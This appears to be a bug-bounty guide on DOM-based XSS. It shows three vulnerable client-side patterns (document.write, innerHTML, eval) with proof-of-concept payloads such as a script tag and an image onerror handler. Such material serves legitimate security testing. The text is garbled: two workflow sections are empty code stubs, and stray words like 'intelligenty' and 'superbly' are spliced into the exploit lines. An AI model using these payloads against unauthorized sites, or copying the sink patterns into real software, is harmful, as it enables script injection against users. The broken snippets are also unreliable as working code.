# DOM-Based XSS

## When to Use
- When auditing modern Single Page Applications (SPAs) built with frameworks like React, Angular, or purely complex vanilla JavaScript.
- When searching for client-side vulnerabilities where user input is processed directly in the browser (e.g., via `location.hash`, `window.name`, or `document.referrer`).


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Understanding DOM XSS

```text
# Concept: DOM XSS ```

### Phase 2: Identifying Sources and Sinks

```text
# Common Sources ```

### Phase 3: Exploitation Examples

```javascript
# Example 1: `document.write` // VULNERABLE CODE let query = new URLSearchParams(window.location.search).get('q');
document.write("Results for: " + query); // SINK

// EXPLOIT target.com/search?q=<script>alert(1)</script>


# Example 2: `innerHTML` VULNERABLE CODE let hash = window.location.hash.slice(1);
document.getElementById('profile').innerHTML = decodeURIComponent(hash); // SINK

// EXPLOIT intelligenty // target.com/#<img%20src=x%20onerror=alert(document.domain)>


# Example 3: `eval()` VULNERABLE CODE let data = window.name;
eval("var x = " + data); // SINK

// EXPLOIT superbly // window.name = "1; alert('XSS') //";
// window.location = "http://target.com/vuln";
```
